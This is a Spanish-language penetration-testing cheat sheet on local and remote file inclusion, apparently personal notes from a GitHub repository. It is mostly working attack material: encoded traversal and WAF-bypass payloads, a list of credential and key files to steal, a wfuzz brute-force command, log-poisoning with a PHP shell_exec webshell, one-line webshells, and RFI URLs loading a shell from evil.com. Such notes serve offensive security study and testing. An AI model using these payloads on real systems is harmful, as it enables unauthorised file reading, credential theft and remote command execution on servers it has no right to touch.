# LFI

### Indentificacion de vulnerabilidades LFI:

- Uso excesivo de rutas relativas: Si la URL permite que el usuario especifique rutas relativas, como "../../archivo_secreto"
  
- Parámetros que parecen nombres de archivos: Si los parámetros en la URL parecen nombres de archivos, como "archivo=nombre_de_archivo"

- Rutas de archivos completas: Si la URL muestra rutas de archivos completas, como "C:\ruta\al\archivo", esto podría ser una indicación de una LFI, especialmente en sistemas Windows.


> Antes de empezar a bucar archivos sensibles es bueno buscar archivos que siempre van a estar en el sistema como /etc/hosts que esta presente tanto en Linux como en Windows y ademas confirmamos rapidamente la vulnerabilidad.

### Explotacion
La explotación de estas vulnerabilidades depende del lenguaje de programación en el que este escrita la aplicación y la configuración del servidor. En el caso de PHP, la versión del tiempo de ejecución del lenguaje y configuraciones del servidor web, específicamente valores de php.ini como `register_globals` y `allow_url wrappers`, marcan una diferencia considerable en la forma en que se pueden explotar estas vulnerabilidades.

A la hora de explotar un LFI buscamos:
1. Recolectar informacion de archivos sensibles
   - Archivos de configuracion de la aplicacion web
     - Exploits publicos
     - Repositorio de Github de la aplicacion
     - Google
   - Archivos del sistema
2. Conseguir ejecucion de codigo en el servidor

#### Bypass de filtros/WAF

````bash

# Null byte
http://example.com/index.php?page=../../../etc/passwd%00

Doble encoding
http://example.com/index.php?page=%252e%252e%252fetc%252fpasswd
http://example.com/index.php?page=%252e%252e%252fetc%252fpasswd%00

# UTF-8 encoding
http://example.com/index.php?page=%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/etc/passwd
http://example.com/index.php?page=%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/etc/passwd%00

# Path and dot truncation

http://example.com/index.php?page=../../../etc/passwd............[ADD MORE]
http://example.com/index.php?page=../../../etc/passwd\.\.\.\.\.\.[ADD MORE]
http://example.com/index.php?page=../../../etc/passwd/./././././.[ADD MORE] 
http://example.com/index.php?page=../../../[ADD MORE]../../../../etc/passwd

Otros bypass
http://example.com/index.php?page=....//....//etc/passwd
http://example.com/index.php?page=..///////..////..//////etc/passwd
http://example.com/index.php?page=/%5C../%5C../%5C../%5C../%5C../%5C../%5C../%5C../%5C../%5C../%5C../etc/passwd
````

#### Archivos comunes

El proceso de inclusion de archivos podemos realizarlo de manera manual buscando archivos comunes del sistema o mediante fuerza bruta.

Archivos de sistema 

|LINUX                  | WINDOWS                  |
|:---------------------:|:-------------------------:|
|/etc/passwd|C:/Windows/system32/config/regback/sam|
|/etc/shadow|C:/Windows/system32/config/regback/SYSTEM|
|/etc/issue||
|/etc/crontab||
|/home/user/.ssh/id_rsa||
|/etc/knockd.conf||

> En caso de haber enumerado algun usuario debemos buscar si hay alguna clave rsa en su directorio personal `/home/user/.ssh`  o `C:\Users\user\.ssh`


Archivos de aplicacion
````
# Tomcat
/etc/tomcat7/tomcat-users.xml

# Apache
/var/log/httpd-access.log   # Linux logs
C:\xampp\apache\logs\access.log # Windows logs
/etc/apache2/sites-enabled/000-default.conf  # Configuracion

# Filezilla
C:/Program Files (x86)/FileZilla Server/FileZilla Server.xml

# phpMyAdmin
/etc/phpmyadmin/config-db.php

# Wordpress
/var/www/html/wp-config.php

# Redis
/etc/redis/redis.conf
/etc/systemd/system/redis.service

# XAMPP
xampp/apache/conf/http.conf
/security/webdav.htpasswd
index.php

# FreeBSD
/usr/local/etc/apache22/httpd.conf

````
> Debemos enumerar bien el webroot ya que podemos encontrar la raiz de otras aplicaciones web ocultas en el servidor, principalmente buscamos `ìndex.php` o `index.html`
> /var/www/html/wordpress/index.php
> /var/www/html/index.php
> /var/www/html/index.html

#### Automatizacion

Podemos automatizar el proceso de explotacion de LFI usando herramientas como [Kadimus](https://github.com/P0cL4bs/Kadimus) o [LFISuite](https://github.com/D35m0nd142/LFISuite) o hacer fuerza bruta con [listas de archivos](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/File%20Inclusion/Intruders)

````
 wfuzz -c -w /usr/share/seclists/Fuzzing/LFI/LFI-LFISuite-pathtotest-huge.txt -u <ip>/manage.php?file=FUZZ 
````

#### LFI/RFI to RCE

- Log poisoning 

Un ataque de log poisoning consiste en inyectar un payload php en los logs de la aplicacion web y ejecutarlo a traves de la vulnerabilidad LFI. Para ello primero debemos tener acceso a los logs de la aplicacion que se pueden encontrar en las diferentes rutas mencionadas anteriormente.

![image](https://github.com/n3masyst/Pentesting/assets/133997401/bc39b3cd-8d28-4eb6-9aa8-41f1cf0d1342)

Inyectaremos el siguiente payload conectandonos con netcat al puerto web
````php
<?php echo '<pre>' . shell_exec($_GET['cmd']) . '</pre>';?>
````
Una vez subido el payload podemos ejecutar comandos a traves del parametro cmd

`http://<ip>:8080/site/index.php?page=c:\xampp\apache\logs\access.log&cmd=ipconfig`

- PHP Webshell Upload

> Teniendo acceso a la webroot mediante algun otro servicio (FTP, SMB, Webdav) con permisos de subida podemos subir una reverse shell que podemos llamar a traves de la vulnerabildiad LFI

````php
# Oneline
<? php echo shell_exec ($_GET[‘cmd’]); ?>
<? php echo shell_exec (‘<command>’); ?>
<pre>system(“<command>”)</pre>
<?php echo '<pre>' . shell_exec($_GET['cmd']) . '</pre>';?>
````
- [php-reverse-shell](https://github.com/pentestmonkey/php-reverse-shell/blob/master/php-reverse-shell.php)

- PHP Wrappers

# RFI

> La inclusión remota de archivos (RFI) es un tipo de vulnerabilidad que ocurre cuando una aplicación incluye un archivo remoto, generalmente a través de la entrada del usuario, sin validar o desinfectar adecuadamente la entrada.

Se pueden usar los mismos filtros de bypass de LFI para RFI

````
http://example.com/index.php?page=http://evil.com/shell.txt

# Null byte
http://example.com/index.php?page=http://evil.com/shell.txt%00

# Doble encoding
http://example.com/index.php?page=http:%252f%252fevil.com%252fshell.txt
````

# Path traversal

